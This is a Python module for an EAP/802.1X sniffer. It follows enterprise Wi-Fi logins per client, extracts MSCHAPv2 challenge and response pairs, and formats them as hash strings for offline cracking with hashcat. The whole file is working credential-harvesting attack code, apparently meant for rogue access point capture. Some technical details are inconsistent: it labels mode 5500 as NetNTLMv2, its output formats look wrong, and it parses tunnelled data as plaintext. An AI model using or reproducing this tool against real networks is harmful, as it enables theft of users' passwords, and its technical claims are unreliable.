"""
EAP frame sniffer and state machine for 802.1X capture.

Tracks EAP-Identity / EAP-PEAP / EAP-TTLS exchanges per client MAC.
Emits MSCHAPv2Crackable when a complete challenge+response pair is seen.
"""
from __future__ import annotations

import struct
from dataclasses import dataclass
from enum import IntEnum
from typing import Callable


# -- EAP constants -----------------------------------------------------------

class EapCode(IntEnum):
    REQUEST  = 1
    RESPONSE = 2
    SUCCESS  = 3
    FAILURE  = 4


class EapType(IntEnum):
    IDENTITY   = 1
    NAK        = 3
    MD5        = 4
    TLS        = 13
    TTLS       = 21
    PEAP       = 25
    MSCHAPV2   = 26


# EAP frame: code(1) id(1) length(2) type(1) data(...)
_EAP_HDR = struct.Struct("!BBHB")
_EAP_HDR_NO_TYPE = struct.Struct("!BBH")

# MSCHAPv2 sub-frame inside PEAP/TTLS TLS tunnel:
# opcode(1) mschapv2_id(1) ms_length(2) value_size(1) challenge(16) name(...)
_MSCHAPV2_CHALLENGE = struct.Struct("!BBHB16s")
# response: opcode(1) id(1) ms_length(2) value_size(1) peer_challenge(16) reserved(8) nt_response(24) flags(1)
_MSCHAPV2_RESPONSE  = struct.Struct("!BBHB16s8s24sB")


@dataclass
class MSCHAPv2Crackable:
    """Hashcat mode 5500 / NetNTLMv2-ready credential blob."""
    client_mac: str
    username: str
    authenticator_challenge: bytes  # 16 bytes
    peer_challenge: bytes           # 16 bytes
    nt_response: bytes              # 24 bytes

    def to_netntlmv2(self) -> str:
        """Format compatible with hashcat -m 5500 and Responder capture logs."""
        return (
            f"{self.username}::::"
            f"{self.authenticator_challenge.hex()}:"
            f"{self.peer_challenge.hex()}:"
            f"{self.nt_response.hex()}"
        )

    def to_hashcat_5500(self) -> str:
        return (
            f"{self.username}::"
            f":{self.authenticator_challenge.hex()}:"
            f"{self.nt_response.hex()}:"
            f"{self.peer_challenge.hex()}"
        )


@dataclass
class _ClientEapState:
    identity: str = ""
    auth_challenge: bytes = b""
    peer_challenge: bytes = b""
    nt_response: bytes = b""
    eap_id: int = 0


class EapCapture:
    """
    Feed raw EAPOL payload bytes (after 802.1X header) per client MAC.
    Register a callback to receive MSCHAPv2Crackable when a full exchange lands.
    """

    def __init__(self, on_capture: Callable[[MSCHAPv2Crackable], None]) -> None:
        self._on_capture = on_capture
        self._clients: dict[str, _ClientEapState] = {}

    def feed_eapol(self, client_mac: str, eapol_payload: bytes) -> None:
        # EAPOL header: version(1) type(1) length(2)
        if len(eapol_payload) < 4:
            return
        eapol_type = eapol_payload[1]
        if eapol_type != 0:  # 0 = EAP-Packet
            return
        eap_data = eapol_payload[4:]
        self._process_eap(client_mac, eap_data)

    def _process_eap(self, mac: str, data: bytes) -> None:
        if len(data) < 5:
            return
        code, eap_id, length = struct.unpack_from("!BBH", data)
        eap_type = data[4] if len(data) > 4 else 0
        payload = data[5:]

        state = self._clients.setdefault(mac, _ClientEapState())
        state.eap_id = eap_id

        if code == EapCode.RESPONSE and eap_type == EapType.IDENTITY:
            state.identity = payload.decode(errors="replace").strip("\x00")
            return

        if eap_type in (EapType.PEAP, EapType.TTLS):
            # TLS record inside - skip TLS framing (flags byte) and try to find MSCHAPv2
            tls_payload = payload[1:] if payload else b""
            self._parse_mschapv2_tunnel(mac, state, code, tls_payload)

    def _parse_mschapv2_tunnel(
        self,
        mac: str,
        state: _ClientEapState,
        eap_code: int,
        tls_data: bytes,
    ) -> None:
        if len(tls_data) < 1:
            return
        opcode = tls_data[0]

        if opcode == 1 and len(tls_data) >= _MSCHAPV2_CHALLENGE.size:
            # Server challenge
            try:
                _, _, _, value_size, challenge = _MSCHAPV2_CHALLENGE.unpack_from(tls_data)
                state.auth_challenge = challenge
            except struct.error:
                pass
            return

        if opcode == 2 and len(tls_data) >= _MSCHAPV2_RESPONSE.size:
            # Client response
            try:
                _, _, _, value_size, peer_ch, _, nt_resp, _ = _MSCHAPV2_RESPONSE.unpack_from(tls_data)
                state.peer_challenge = peer_ch
                state.nt_response = nt_resp
            except struct.error:
                return
            if state.auth_challenge and state.nt_response:
                crackable = MSCHAPv2Crackable(
                    client_mac=mac,
                    username=state.identity or mac,
                    authenticator_challenge=state.auth_challenge,
                    peer_challenge=state.peer_challenge,
                    nt_response=state.nt_response,
                )
                self._on_capture(crackable)
                # reset state for next exchange
                self._clients[mac] = _ClientEapState()
